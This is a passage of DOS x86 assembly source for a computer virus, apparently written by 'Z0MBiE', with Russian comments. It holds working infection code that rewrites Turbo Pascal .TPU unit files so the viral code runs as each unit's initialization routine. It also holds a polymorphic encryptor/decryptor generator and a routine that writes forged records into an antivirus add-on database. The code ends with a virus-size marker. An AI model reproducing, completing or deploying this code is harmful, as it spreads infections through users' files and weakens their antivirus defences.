                xor     ah, ah
                xchg    cx, ax
                mov     dx, si         ; в имени может быть path, ищем имя
@@1:            lodsb
                cmp     al, '\'
                jne     @@2
                mov     dx, si
@@2:            loop    @@1
                mov     si, dx         ; si=имя с НАМ НЕНУЖНЫМ расширением

                lea     di, unitname   ; копируем одно только имя в unitname
                mov     cx, 8          ; а заодно посчитаем длину имени
                mov     unitlen, ch
@@4:            lodsb
                cmp     al, '.'
                je      @@3
                call    upcase         ; и сконвертим имя в UPPERCASE
                stosb
                inc     unitlen
                loop    @@4

@@3:            xor     cx, cx         ; читаем UHLDU - список юзаемых юнитов
                mov     dx, uh.ldu
                call    seekfile
                lea     dx, buf        ; в буфер
                mov     cx, uh.lsf   ; размер UHLDU
                sub     cx, uh.ldu
                call    readfile

                lea     si, buf        ; а теперь гиморойчик - надо найти
                mov     cx, 256        ; оффсет entry имени в UHLDU
@@6:            lodsb                  ; entry:
                cmp     al, unitlen    ; 00 00 00 00 ll nn nn nn nn ....
                jne     @@5            ; где ll=длина имени, nn = имя
                lea     dx, [si - 5 + -(offset buf)]
                pusha
                lea     di, unitname
                movzx   cx, al
@@7:            lodsb
                call    upcase
                scasb
                loope   @@7
                popa
                jz      @@8
@@5:            loop    @@6
                jmp     @@close        ; видно нас сглючило,
@@8:            mov     nameoffs, dl   ; хотя, кто знает... ;)  (нашли)

                mov     eax, dword ptr nameoffs    ; dont infect system.tpu
                cmp     eax, 'SYS'
                je      @@close

                mov     ax, uh.tmt   ; size UHCMT
                sub     ax, uh.cmt   ; добавим в proc entry офсет entry
                mov     myentry.csegofs, ax  ; нашего cmapа в cmaptable


                xor     cx, cx         ; считаем первую ентри из UHPMT
                mov     dx, uh.pmt   ; - procmap table
                call    seekfile       ; ибо она - unit initialization proc
                lea     dx, firstentry
                mov     cx, 8
                call    readfile

                ; тут есть 2 варианта:
                ; либо и юнита есть initproc, и это пиздец, ;)
                ; либо у юнита нет initproc и это тоже пиздец ;))

                cmp     firstentry.csegofs, 0FFFFh
                jne     @@a

                mov     mycodeseg.csegrel, 0  ; C00L - фиксапы ненужны ;)

                mov     di, tpucall
                mov     cx, 5
                mov     al, 90h
                rep     stosb

                jmp     @@b

@@a:
;               придётся добавить 1 fix-up, чтобы вызвать старый init :(

                mov     mycodeseg.csegrel, 8

@@b:


                ; а вот теперь можно начать buildить новый юнит

                lea     si, uh
                lea     di, uh2
                mov     cx, uhsize
                rep     movsb

                mov     ah, 3ch
                lea     dx, tempfile
                xor     cx, cx
                int     21h
                xchg    bp, ax          ; output handle будет в BP

                ; для начала переделаем хеадер

                mov     cx, 8           ; 8 байт добавим к uhcmt
                cmp     firstentry.csegofs, 0FFFFh
                je      @@9
                add     cl, 8           ; 8 байт добавим к uhpmt
                add     uh2.zfv, 8      ; 8 байт добавим к uhzfv (fixup)
                add     uh2.cmt, 8

@@9:            add     uh2.tmt, cx   ; соответственно надо
                add     uh2.dmt, cx   ; скорректировать поинтеры
                add     uh2.dll, cx
                add     uh2.ldu, cx
                add     uh2.lsf, cx
                add     uh2.dbt, cx

                add     uh2.zda, cx
                add     uh2.zcs, cx

                add     uh2.zfa, tpucodesize  ; столько байт добавим к коду

                xchg    bp, bx          ; запишем хеадер
                lea     dx, uh2
                mov     cx, uhsize
                call    writefile
                xchg    bp, bx

                mov     dx, uhsize      ; seek(inhandle, $60)
                xor     cx, cx
                call    seekfile

                mov     cx, uh.pmt    ; копируем хуйню до uhpmt
                sub     cx, uhsize
                call    copybxbp

                ; добавим в начало procmaptable свою entry

                lea     dx, myentry
                mov     cx, 8
                xchg    bp, bx
                call    writefile
                xchg    bp, bx

                xor     cx, cx

                cmp     firstentry.csegofs, 0FFFFh
                jne     @@10

                lea     dx, buf         ; считаем старую entry
                mov     cx, 8
                call    readfile

                mov     cx, -8

@@10:           add     cx, uh.tmt    ; копируем uhpmt + uhcmt
                sub     cx, uh.pmt
                call    copybxbp




                lea     dx, mycodeseg   ; добавим mycodeseg к uhcmt
                mov     cx, 8
                xchg    bp, bx
                call    writefile
                xchg    bp, bx


                mov     cx, uh.zcs    ; копируем оставшуюся хуйню
                sub     cx, uh.tmt
               ; inc     cx
                call    copybxbp

                ;;

                call    copy16
                call    read16

                mov     cx, uh.zfa
                call    copybxbp

                lea     dx, tpucode     ; копируем наш кодовый сегмент
                mov     cx, tpucodesize
                xchg    bp, bx
                call    writefile
                xchg    bp, bx

                call    copy16
                call    read16

                mov     cx, uh.zft    ; ещё немного хуйни
                call    copybxbp

                call    copy16
                call    read16

                cmp     firstentry.csegofs, 0FFFFh
                je      @@11

                ; и последняя гиморойнейшая хуетень - таблица ёбаных фиксапов

                ; uhzfv

                mov     si, uh.zfv
                shr     si, 3

@@13:           lea     dx, buf
                mov     cx, 8
                call    readfile

                ;;
                mov     al, nameoffs
                cmp     buf.byte ptr 0, al
                jne     @@14

                mov     al, buf.byte ptr 1
                and     al, 0cfh
                jnz     @@14

                add     buf.word ptr 2, 8

@@14:           lea     dx, buf
                mov     cx, 8
                xchg    bp, bx
                call    writefile
                xchg    bp, bx
                ;;

                dec     si
                jnz     @@13


                lea     dx, fixup1
                mov     cx, 8
                xchg    bp, bx
                call    writefile
                xchg    bp, bx

                jmp     @@12

@@11:           mov     cx, uh.zfv
                call    copybxbp

@@12:           call    copy16
                call    read16

                mov     cx, uh.dht
                call    copybxbp

                call    copy16

@@done:         xchg    bp, bx
                call    closefile
                xchg    bp, bx

                call    closefile

                mov     ah, 41h
                lea     dx, tpu_name
                xor     cx, cx
                int     21h

                mov     ah, 56h
                mve     es, cs
                mov     di, dx
                lea     dx, tempfile
                int     21h

                jmp     @@exit

@@close:        call    closefile

@@exit:         pop     es ds
                popa

                ret

readfile:       mov     ah, 3fh
                int     21h
                ret

writefile:      mov     ah, 40h
                int     21h
                ret

seekfile:       mov     ax, 4200h
                int     21h
                ret

copybxbp:       mov     si, cx
                jcxz    @@3

@@2:            mov     cx, 256
                cmp     si, cx
                ja      @@1
                mov     cx, si

@@1:            lea     dx, buf
                call    readfile

                xchg    bp, bx
                call    writefile
                xchg    bp, bx

                sub     si, cx
                jnz     @@2

@@3:            ret

copy16:         xchg    bp, bx

                mov     ax, 4201h
                cwd
                xor     cx, cx
                int     21h

                mov     cx, ax

                add     cx, 15
                and     cl, not 15

                sub     cx, ax

                lea     dx, zero16
                call    writefile

                xchg    bp, bx
                ret

read16:         mov     ax, 4201h
                cwd
                xor     cx, cx
                int     21h

                mov     cx, ax

                add     cx, 15
                adc     cx, 0
                and     cl, not 15

                sub     cx, ax

                lea     dx, buf
                call    readfile

                ret

upcase:         cmp     al, 'a'
                jb      @@1
                cmp     al, 'z'
                ja      @@1
                add     al, 'A'-'a'
@@1:            ret


                ;;



; ===========================================================================

inittpucode:    mve     es, cs
                lea     di, tpucode

                mov     al, 55h     ; PUSH BP
                stosb
                mov     ax, 0E589H  ; MOV BP, SP
                stosw

                call    tpurnd

                mov     ax, 076C4H  ; les si, [bp + 2]
                stosw
                mov     al, 2
                stosb

                call    tpurnd

                mov     al, 26h     ; es:
                stosb

                mov     ax, 748bh   ; mov si, [si - 4]
                stosw
                mov     al, -4
                stosb

                call    tpurnd

                mov     ax, 0C681h  ; add si, xxxx
                stosw
                push    di
                stosw

                call    tpurnd

newseg          equ     0B900h - 100h shr 4

                mov     al, 068h    ; push xxxx
                stosb
                mov     ax, newseg
                stosw

                call    tpurnd

                mov     al, 07h     ; pop es
                stosb

                call    tpurnd

                mov     al, 0bfh    ; mov di, xxxx
                stosb
                mov     ax, 0100h
                stosw

                call    tpurnd

                mov     al, 0b9h    ; mov cx, xxxx
                stosb
                mov     ax, 8192
                stosw

                call    tpurnd

                mov     al, 0fch    ; cld
                stosb

                call    tpurnd

                push    di          ; @@@:

                mov     ax, 0AC2Eh  ; CS: lodsb
                stosw

                call    tpurnd

                mov     ax, tpumaxdecr
                call    rnd
                xchg    bx, ax
                shl     bx, 1

                call    tpurnd

                mov     ax, tpudecr[bx]
                stosw

                call    tpurnd

                mov     ax, tpuencr[bx]
                mov     encryptor, ax

                mov     al, 0AAH    ; stosb
                stosb

                call    tpurnd

                mov     al, 0e2h    ; loop @@@
                stosb
                pop     ax
                sub     ax, di
                dec     ax
                stosb

                call    tpurnd

                mov     al, 9ah
                stosb
                mov     ax, offset tpu_start
                stosw
                mov     ax, newseg
                stosw

                call    tpurnd

                mov     al, 068h    ; push xxxx
                stosb
                mov     ax, newseg
                stosw

                call    tpurnd

                mov     al, 07h     ; pop es
                stosb

                call    tpurnd

                mov     al, 0bfh    ; mov di, xxxx
                stosb
                mov     ax, 0100h
                stosw

                call    tpurnd

                mov     al, 0b9h    ; mov cx, xxxx
                stosb
                mov     ax, 4096
                stosw

                call    tpurnd

                mov     al, 0b8h    ; mov ax, xxxx
                stosb
                mov     ax, 0720H
                stosw

                call    tpurnd

                mov     ax, 0abF3h  ; rep stosw
                stosw

                call    tpurnd

                mov     tpucall, di

                lea     ax, [di+1+-(offset tpucode)]
                mov     fixupptr, ax

                mov     al, 9ah
                stosb
                xor     ax, ax
                stosw
                stosw

                call    tpurnd

                mov     al, 5DH     ; POP BP
                stosb
                mov     al, 0CBh    ; RETF
                stosb

                lea     ax, [di + -(offset tpucode)]
                pop     bx
                mov     [bx], ax

                lea     si, start
                mov     cx, tpucodesize
@@1:            lodsb
encryptor       dw      ?
                stosb
                loop    @@1

                ret

tpurnd:         mov     ax, 3
                call    rnd
                dec     ax
                jz      @@_01
                dec     ax
                jz      @@_02
                dec     ax
                jz      @@_03
                ret

@@_01:          mov     al, 8ah

@@_01a:         stosb
                call    random
                and     ax, 0700h
                mov     al, ah
                shl     al, 3
                or      al, ah
                or      al, 0C0h
                stosb
                ret

@@_02:          mov     al, 8Bh
                jmp     @@_01a

@@_03:          mov     al, 90h
                stosb
                ret

; ===========================================================================
; ===========================================================================

web_infectdop:  lea     dx, web_orig
                mov     cx, 2048
                call    readfile
                mov     web_origsize, ax

                xchg    cx, ax

                mov     si, dx

                add     dx, cx
                dec     dx
                dec     dx
                dec     dx

@@1:            cmp     si, dx
                jae     @@close
                cmp     dword ptr [si], ' weN'
                je      @@2
                inc     si
                jmp     @@1
@@2:            add     si, 133

                xor     cx, cx
                lea     dx, [si + -(offset web_orig)]
                call    seekfile

                push    bx
                call    web_gendop
                pop     bx

                lea     dx, web_encr
                mov     cx, web_encrsize
                call    writefile

                xor     cx, cx
                call    writefile

@@close:        call    closefile

@@exit:         pop     es ds
                popa
                ret

                ; input:  SI=offset
                ;         CX=size
                ; output: DX:AX=checsum

web_calccs:     xor     ax, ax
                cwd
                jcxz    @@2
                cld
@@1:            xor     dh, dl
                xor     dl, ah
                xor     ah, al
                lodsb
                xor     al, dh
                loop    @@1
@@2:            ret

web_gendop:     lea     di, web_norm + 6
                cld

                mov     ax, 667   ; version
                stosw
                mov     al, 0     ; ?
                stosb
                mov     al, 50    ; viruses in addon
                stosb

                mov     al, 'B'   ; ---------------
                stosb
                mov     al, 0     ; ноль/не ноль - существенно только для F-вирусов
                stosb

                mov     ax, web_stamm_size + 6  ; объем штаммов
                stosw

                lea     si, web_stamm
                mov     cx, web_stamm_size
                rep     movsb

                mov     ax, -1  ; последний штамм
                stosw
                stosw
                stosw

                mov     ax, web_name_size  ; объем имен
                stosw

                xchg    cx, ax   ; имя
                lea     si, web_name
                rep     movsb

                ; указатели на указатели на имена. к словам по этим адресам
                ; добавится смещение имен в сегменте штаммов

                mov     ax, 0018h
                stosw
                xor     ax, ax
                stosw

                mov     ax, 001Eh       ; а это непомню что за хуйня,
                stosw                   ; кажется тоже релокейшн какой-то...
                xor     ax, ax
                stosw

                ; размер лечилок
                mov     ax, web_fuck_size
                add     ax, 4
                stosw

                ; лечилка

                mov     ax, web_fuck_size  ; сколько кода
                stosw

                xchg    cx, ax
                lea     si, web_fuck
                rep     movsb

                xor     ax, ax   ; опять указатели на релокейшны. в конце-0
                stosw

                xor     ax, ax   ; конец - пиздец
                stosw

                stosw ;???

                mov     ax, di
                sub     ax, offset web_norm

                mov     web_normsize, ax

                sub     ax, 6
                lea     di, web_norm
                stosw

                lea     si, web_norm + 6
                mov     cx, ax
                call    web_calccs

                stosw
                xchg    dx, ax
                stosw

; ---------------------------------------------------------------------------

                mov     ax, web_normsize
                inc     ax
                inc     ax
                cwd
                mov     cx, 3
                div     cx
                xchg    cx, ax

                lea     si, web_norm
                lea     di, web_encr

                xor     bp, bp

@@1:            lodsb
                mov     ah, al

                shr     al, 2

                call    web_encrbyte
                stosb

                and     ah, 11b
                shl     ah, 4

                lodsb

                push    ax

                shr     al, 4
                or      al, ah

                call    web_encrbyte
                stosb

                pop     ax

                mov     ah, al
                and     ah, 1111b
                shl     ah, 2

                lodsb

                push ax

                shr     al, 6
                or      al, ah

                call    web_encrbyte
                stosb

                pop     ax

                and     al, 00111111b
                call    web_encrbyte
                stosb

                inc     bp
                cmp     bp, 14
                jne     @@3
                xor     bp, bp

                mov     ax, 0a0dh
                stosw

@@3:            loop    @@1

                mov     al, '`'
                stosb
                stosb
                stosb
                mov     ax, 'di'        ; id
                stosw
                mov     ax, 0a0dh
                stosw

                sub     di, offset web_encr
                mov     web_encrsize, di

                ret

web_encrbyte:   or      al, al
                jnz     @@1
                mov     al, 40h
@@1:            add     al, 20h
                ret

web_name        db      'Z0MBiE',0
web_name_size   equ     $-web_name

web_stamm_size  equ     32
web_stamm       db      2 dup (0E9h, 0,0, 1, 0E9h,0,0,0)
                db      0FFh,8Fh,80h, 0,0, 5bh,0d5h,0, 0,0, 0,0, 0,0,0,0

; ===========================================================================
; ===========================================================================

tpudecr         label   word
                inc     al
                dec     al
                neg     al
                not     al
                ror     al, 1
                rol     al, 1
                xor     al, 55h
                add     al, 55h
                sub     al, 55h
tpumaxdecr      equ     ($-tpudecr)/2



tpuencr         label   word
                dec     al
                inc     al
                neg     al
                not     al
                rol     al, 1
                ror     al, 1
                xor     al, 55h
                sub     al, 55h
                add     al, 55h

                ; вот такой codemap entry добавим в codemap table

zero16          db      16 dup (0)

cmapentry       struc
CSegWd0         dw      0               ; purpose is unknown
CSegCnt         dw      tpucodesize     ; byte count of module code
CSegRel         dw      ?               ; byte count of module Relo List
CSegTrc         dw      0FFFFH          ; Trace table offset or $FFFF
                ends
; cmaprec
mycodeseg       cmapentry <0,tpucodesize,?,0FFFFh>

                ; вот такую pmap entry добавим в procmap table
                ; причём добавим её в начало,
                ; чтобы стала она подпрограмкой инициализации юнита ;)

pmapentry       struc
ProcWd1         dw      ?       ; purpose is unknown
ProcWd2         dw      ?       ; contains proc attribute flags?
CSegOfs         dw      ?       ; offset within CSeg Map; $FFFF if null
CSegJmp         dw      ?       ; offset to entry point;  $FFFF if null
                ends

myentry         pmapentry <0,0,?,tpuinit>

fixup1:
nameoffs        db      ?
                db      00110000b
                dw      8
                dw      0
fixupptr        dw      ?


; ===========================================================================

                db      3 dup (13,10)
                db      'code size: '
                db      virsize /  1000 mod 10 + '0'
                db      virsize /   100 mod 10 + '0'
                db      virsize /    10 mod 10 + '0'
                db      virsize /     1 mod 10 + '0'
                db      ' byte(s)',13,10
                db      3 dup (13,10)

; ===========================================================================

                DB      'EOV'

; ===========================================================================

virsize         equ     $-start


xbuf            db      512 dup (?)



ftype           db      ?
save_dx         dw      ?
com_infected    db      ?
tpu_infected    db      ?
dta             dta_struc ?
searchdta       dta_struc ?
outbuf          db      ?

; ===========================================================================
; ===========================================================================

web_origsize    dw      ?
web_normsize    dw      ?
web_encrsize    dw      ?

web_orig        db      2048 dup (?)
web_norm        db      16384 dup (?)
web_encr        db      16384 dup (?)

; ===========================================================================
; ===========================================================================

tpucall         dw      ?

firstentry      pmapentry ?

LL              struc           ; поинтер внутри юнита
                dw      ?
                ends

unitlen         db      ?       ; тут храним имя юнита
unitname        db      8 dup (?)

uhSTRUC         struc           ;  old format                          real 7.0 format
EYE             dd      ?       ; +00  TPU9                                       TPUsig : SigType;     "TPUQ" signature}
xxx             dd      ?       ; +04  0                                          NextUnit,             segment in memory for next unit}     NextLibrary,           {segment in memory for next library}
UDH             LL      ?       ; +08  to DName Entry for This Unit               UsesPtr,              offset to unit name/symbol table}
IHT             LL      ?       ; +0A  to Interface Hash Header                   ScopePtr,             offset to hash table}
PMT             LL      ?       ; +0C  to PROC Map                                ProcPtr,              offset to procedure table}
CMT             LL      ?       ; +0E  to CSeg Map                                GroupPtr,             offset to Group table}
TMT             LL      ?       ; +10  to DSeg Map-Typed CONST's                  ConGrPtr,             Const group table pointer}
DMT             LL      ?       ; +12  to DSeg Map-GLOBAL Variables               DatGrPtr,             Data group table pointer}
DLL             LL      ?       ; +14  to DLL Module List                         DynaLinkPtr,          offset to DLL link names table}
LDU             LL      ?       ; +16  to Donor Unit List                         LinkPtr,              offset to link names table}
LSF             LL      ?       ; +18  to Source File List                        NamePtr,              offset to filename table}
DBT             LL      ?       ; +1A  DEBUG Trace Table                          LineXlatePtr,         offset to line number translation table}
ZDA             DW      ?       ; +1C  Size of DICTIONARY Area                    DebugPtr,             offset to line number table}
ZCS             DW      ?       ; +1E  CSEG Size-Aggregate                        UnitSize,             symbol table size}
ZDT             DW      ?       ; +20  DSEG Size-Typed CONSTS Only                BrowseSize,           browser data size}
ZFA             DW      ?       ; +22  Fix-Up Size (CSegs)                        CodeSize,             total code (bytes)}
ZFT             DW      ?       ; +24  Fix-Up Size (Typed CONST's)                ConstSize,            initialized data (bytes)}
ZFV             DW      ?       ; +26  DSEG Size for Global VARs                  FixupSize,            size of code fixup table}
DHT             LL      ?       ; +28  to Global Hash Header                      ConFixSize,           size of constant fixup section}
SOV             DW      ?       ; +2A  Flags ??                                   DataSize,             uninitialized data (bytes)}
Pad             DW      24 DUP (?); +2C  Reserved for Future Expansion ?         ;DScopePtr,            debug scope pointer}
ALREDY          DW      ?                                                        ;UnitFlags,            1 if unit compiled with $N+, 2 if $O+}
                ends                                                             ;LastObjectPtr,        pointer to last object in linked list}
                                ;                                                 ;BrowserXrefs,         offset in browser data for cross-references}

tpu_name        db      256 dup (?)

uhsize          equ     size uhstruc
uh              uhSTRUC ?
uh2             uhstruc ?
buf             db      512 dup (?)

tpuinit         equ     0
tpucode         label   byte
tpucodesize     equ     8192

                db      0

                end     start

